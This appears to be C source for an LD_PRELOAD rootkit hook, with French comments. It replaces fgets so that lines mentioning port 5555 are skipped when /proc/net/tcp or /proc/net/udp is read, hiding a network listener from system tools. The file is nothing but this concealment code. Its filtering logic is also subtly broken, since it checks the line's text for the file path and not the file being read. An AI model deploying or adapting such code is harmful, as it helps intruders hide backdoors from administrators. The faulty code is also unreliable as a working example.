#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>
#include "shared.h"

// Ports cachés en hexadécimal
const char *hidden_ports[] = {"15B3", NULL}; // 15B3 = 5555 en hexadécimal

// Redéfinition de fgets comme un hook dynamique
char *fgets(char *str, int size, FILE *stream) __attribute__((visibility("default")));
char *fgets(char *str, int size, FILE *stream) {
    static char *(*orig_fgets)(char *, int, FILE *) = NULL;

    // Charger l'implémentation originale de fgets
    if (!orig_fgets) {
        orig_fgets = dlsym(RTLD_NEXT, "fgets");
        if (!orig_fgets) {
            fprintf(stderr, "Erreur : impossible de charger fgets\n");
            return NULL;
        }
    }

    char *result = orig_fgets(str, size, stream);
    if (result == NULL) {
        return NULL; // Fin de fichier ou erreur
    }

    // Filtrer les ports cachés dans les fichiers réseau
    if (strstr(str, "/proc/net/tcp") || strstr(str, "/proc/net/udp")) {
        for (const char **hidden = hidden_ports; *hidden != NULL; hidden++) {
            if (strstr(str, *hidden)) {
                return orig_fgets(str, size, stream); // Ignore la ligne
            }
        }
    }

    return result; // Retourne la ligne normale sinon
}
